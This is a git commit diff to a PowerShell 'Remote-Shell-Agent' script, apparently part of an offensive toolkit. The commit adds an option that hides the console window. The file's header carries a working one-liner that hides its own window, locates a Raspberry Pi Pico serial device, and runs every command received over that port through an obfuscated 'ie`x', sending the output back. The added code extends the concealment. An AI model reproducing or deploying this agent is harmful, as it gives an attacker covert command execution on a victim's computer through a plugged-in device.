277564b829d6d9604ba004040aa6cafa5ed96e2f
egieb <93350544+beigeworm@users.noreply.github.com>
2025-03-31 11:03:02 +0000

    added hidden console function

--- Scripts/Remote-Shell-Agent.ps1
+++ Scripts/Remote-Shell-Agent.ps1
@@ -7,8 +7,27 @@ one-liner
 ------------
 $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);';$t=Add-Type -M $a -name Win32ShowWindowAsync -ns Win32Functions -Pas;$h=(Get-Process -PID $pid).MainWindowHandle;$Host.UI.RawUI.WindowTitle='xx';$x=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'});$t::ShowWindowAsync($x.MainWindowHandle,0);function fp{(Get-WMIObject Win32_SerialPort | Where-Object PNPDeviceID -match "VID_239A").DeviceID}$d=fp;$p=New-Object System.IO.Ports.SerialPort $d,115200,None,8,one;$p.DtrEnable=$true;$p.RtsEnable=$true;$p.Open();$s=Sleep -M 100;while($true){if($p.BytesToRead -gt 0){$s;$c = $p.ReadLine().Trim();$p.DiscardInBuffer() ;if($c){try{$o=ie`x $c 2>&1;$r=if($o){$o -join "`n"}else{"[Command executed]"}}catch{$r="$_"}$p.WriteLine($r)}}$s}
 
-
 #>
+
+# Hide the console after agent starts
+$hidden = 'n' # 'y' = Hide console | 'n' = Show console
+
+If ($hidden -eq 'y'){
+    Write-Host "Hiding the Window.."  -ForegroundColor Red
+    sleep 1
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+    if($hwnd -ne [System.IntPtr]::Zero){
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+    else{
+        $Host.UI.RawUI.WindowTitle = 'xx'
+        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'xx' })
+        $hwnd = $Proc.MainWindowHandle
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+}
 
 # Function to detect Raspberry Pi Pico's COM Port
 function Find-COMPort {
